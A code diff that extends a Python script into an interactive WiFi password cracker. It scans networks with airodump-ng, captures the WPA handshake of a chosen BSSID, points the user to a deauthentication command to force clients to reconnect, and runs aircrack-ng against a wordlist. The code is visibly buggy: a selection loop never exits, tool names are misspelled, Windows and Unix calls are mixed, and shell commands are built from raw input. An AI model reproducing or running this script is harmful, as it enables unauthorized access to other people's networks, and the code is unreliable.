@@ -157,5 +157,87 @@ while True:
     else:
         break
 
-print("Thank you for using this tool.\nBye.")
-webbrowser.open('https://www.youtube.com/watch?v=oOlft8xFdlY')
+clear()
+
+print("Do you want to crack a wifi password now? [y/n]")
+crack = input()
+
+if crack != "y" and crack != "Y":
+    print("Thank you for using this tool.\nBye.")
+    webbrowser.open('https://www.youtube.com/watch?v=oOlft8xFdlY')
+
+clear()
+
+print("Instuction:\nPlease select a wifi network from the now listed wifi networks.\n!IMPORTANT!\n Please save the bssid, channel and optionaly the wifi name.\nIf you find your Network press CTRL + C\nThis script will automatically keep going after 5 seconds.")
+time.sleep(5)
+
+Popen("airodump-ng " + wlaninput, creationflags=CREATE_NEW_CONSOLE)
+
+print("Please enter of the network the bssid")
+
+bssid = input()
+
+while bssid == "":
+    print("Please enter of the network the bssid") 
+    bssid = input()
+
+print("\nPlease enter of the network the channel")
+
+channel = input()
+
+while channel == "":
+    print("Please enter of the network the channel") 
+    channel = input()
+
+clear()
+
+print("Instuction:\nPlease wait for incomming connections.\n!IMPORTANT!\nIf didn't incomming connections come in open a new Terminal and write 'aireply-ng --deauth 5 -a [your_bssid] -c [your_channel]' \n\nIf you find your Network press CTRL + C\nThis script will automatically keep going after 5 seconds.")
+time.sleep(5)
+
+clear()
+Popen("airodump -c "+channel+" --bssid " + bssid + " -w record.cap " + wlaninput, creationflags=CREATE_NEW_CONSOLE)
+
+clear()
+
+print("Select Mode \n[1]Wordlist\n[2]Random generated words (In work)")
+modecrack = input()
+
+while modecrack != "1" or modecrack != "2":
+    print("Select Mode \n[1]Wordlist\n[2]Random generated words")
+    modecrack = input()
+
+if modecrack == "1":
+    print("Please enter the full path of your wordlist file")
+    path = input()
+    while not os.path.isfile(path):
+        print("File not found.")
+        print("Please enter the full path of your wordlist file")
+        path = input()
+    
+    clear()
+
+    print("Enter the name of the saved connection file")
+    time.sleep(1.5)
+    clear()
+    os.system("ls")
+    cfile = input()
+    while not os.path.isfile(cfile):
+        print("Enter the name of the saved connection file")
+        time.sleep(1.5)
+        clear()
+        os.system("ls")
+        cfile = input()
+
+    clear()
+
+    print("Trying to start cracking. This can take some time....")
+
+    result = subprocess.run("aircrack-ng -w " + path + " -b " + bssid + " " + cfile, stdout=subprocess.PIPE).stdout.decode('utf-8')
+
+    if "No valid WPA handshakes found" in result:
+        print("Failed to find handshakes.\nPlease restart the script")
+        quit()
+    quit()
+
+elif modecrack == "2":
+    quit()
